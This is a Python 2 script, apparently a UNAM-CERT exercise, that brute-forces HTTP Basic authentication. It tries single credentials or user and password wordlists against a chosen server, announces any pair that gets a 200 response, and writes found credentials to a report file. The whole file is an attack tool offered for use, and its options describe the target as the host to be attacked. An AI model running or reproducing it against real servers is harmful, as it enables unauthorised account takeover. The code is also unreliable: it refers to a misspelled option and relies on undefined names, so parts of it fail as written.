#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
# Vallejo Fernández Rafael Alejandro

import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError

def printError(msg, exit = False):
    """Función que imprime mensaje de error y sale del programa
        Recibe: mensage a mostrar y booleano que indica si se debe terminar la ejecución del programa"""
    sys.stderr.write('Error:\t%s\n' % msg)
    if exit:
        sys.exit(1)

def addOptions():
    """Función que agrega opciones al script para su ejecución. Por defecto verbose es False"""
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default = None, help='Password that will be tested during the attack.')
    parser.add_option('-c', '--contrasenas', dest = 'filePasswords', default = None, help = 'Archivo de contrasenas a validar.')
    parser.add_option('-u', '--usuarios', dest = 'fileUsers', default = None, help = 'Archivo de usuarios a validar.')
    parser.add_option('-r', '--reporte', dest= 'reporte', default = None, help = 'Archivo donde se van a escribir los hallazgos.')
    parser.add_option('-v', '--verboso', action='store_true', dest = 'verboso', default = False, help = 'Muestra los pasos que se realizan.')

    opts,args = parser.parse_args()
    return opts

def checkOptions(options):
    """Función que verifica el estado de ciertas de opciones para poder ejecutar el script"""
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if options.user is None and options.fileUsers is None:
        printError('Debes indicar un usuario o un archivo de usuarios.', True)
    if options.user is not None and options.fileUsers is not None:
        printError('Debe ser únicamente un usuario o un archivo de usuarios.', True)
    if options.password is None and options.filePasswords is None:
        printError('Debes indicar una contraseña o un archivo de contraseñas.', True)
    if options.password is not None and options.filePasswords is not None:
        printError('Debe ser únicamente una contraseña o un archivo de contrasenas.', True)

def reportResults(hallazgo, archivo):
    """Función que reporta los hallazgos en un archivo, los halazgos reportados son únicamente cuando se encuentran credenciales válidas
    Recibe texto a escribir y el archivo donde se escribirán"""
    with open(archivo, 'a') as output_file:
        output_file.write(hallazgo)

def buildURL(server, port, verbose, protocol = 'http'):
    """Función que da formato de la URL. Recibe direccion(server), puerto, verbose (si aplica). Devuelve la URL con el formato requerido"""
    url = '%s://%s:%s' % (protocol,server,port)
    if verbose:
        print 'Se obtiene la url con los parámetros indicados (server \'%s\', port \'%s\', protocol \'%s\'): %s' % (server, port, protocol, url)
    return url


def makeRequest(host, user, password, verbose):
    """Función que realiza las peticiones al servidor especificado. Recibe host, user, password y verbose. Si la opcion verbose es True, se
    muestra lo que se está realizando en cada paso."""
    try:
        response = get(host, auth=(user,password))
        if verbose:
            print 'Se está intentando ingresar con usuario \'%s\' contraseña \'%s\'' % (user, password)
            print 'La respuesta (response) obtenida es : %s y, por lo tanto:' % (response)
        if response.status_code == 200:
            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            if opts.reporte != None:
                reportResults('Usuario: \'%s\'\t\tContraseña: \'%s\'\n' % (user,password), opts.reporte)
        else:
            print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

def testPasswords(url, user, pasword, filePasswords, verbose):
    """Función que probará un usuario y las contraseñas si es que se indicó una sola o un archivo de contraseñas.
    Recibe url, user, pasword, filePasswords y verbose"""
    if pasword != None and filePasswords == None:
        if verbose:
            print 'Se indicó únicamente el usuario \'%s\' y la contraseña \'%s\'' % (user, password)
        makeRequest(url, user, password, verbose)
    elif password == None and filePasswords != None:
        with open(filePasswords,'r') as contrasenias:
            if verbose:
                print 'Se indicó únicamente el usuario \'%s\' y el archivo de contraseñas: %s' % (user, filePasswords)
            for contrasenia in contrasenias:
                makeRequest(url, user, contrasenia[:-1], verbose)

def testUsersAndPasswords(url, fileUsers, password, filePasswords, verbose):
    """"Función que probará usuarios porque se indicó un archivo de usuarios y se probará la contraseña o el archivo de contraseñas
    que se haya indicado. Recibe url, fileUsers, password, filePasswords y verbose"""
    with open(fileUsers,'r') as usuarios:
        unPassword = password != None and filePasswords == None
        archivoPassword = password == None and filePasswords != None
        if verbose:
            if unPassword:
                print 'Se indicó el archivo de usuarios \'%s\' y la contraseña \'%s\'' % (fileUsers, password)
            elif archivoPassword:
                print 'Se indicó el archivo de usuarios \'%s\' y el archivo de contraseñas \'%s\'' % (fileUsers, filePasswords)
        for user in usuarios:
            if unPassword:
                makeRequest(url, user[:-1], password, verbose)
            elif archivoPassword:
                with open(filePasswords,'r') as contrasenias:
                     for contrasenia in contrasenias:
                         makeRequest(url, user[:-1], contrasenia[:-1], verbose)

if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port, verbose = opts.verboso)
        if opts.reporte != None:  # Si se indicó archivo para escribir el reporte, se escribiran los hallazgos de usuarios válidos
            with open(opts.reporte, 'w') as nuevo_reporte:
                nuevo_reporte.write('Los usuarios y contraseñas válidos son:\n')
        if opts.user != None and opts.fileUsers == None:  # Si se indicó un solo usuario, se probarán las contraseñas o la contraseña que se indique
            testPasswords(url, opts.user, opts.pasword, opts.filePasswords, opts.verboso)
        elif opts.user == None and opts.fileUsers != None:  # Si se indicó un archivo de usuarios se probarán las contraseñas o la contraseña que se indique
            testUsersAndPasswords(url, opts.fileUsers, opts.password, opts.filePasswords, opts.verboso)
    except IOError as lecturaArchivo:
        printError('El archivo que contiene los usuarios o las contraseñas no se encuentra')
        printError(lecturaArchivo, True)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
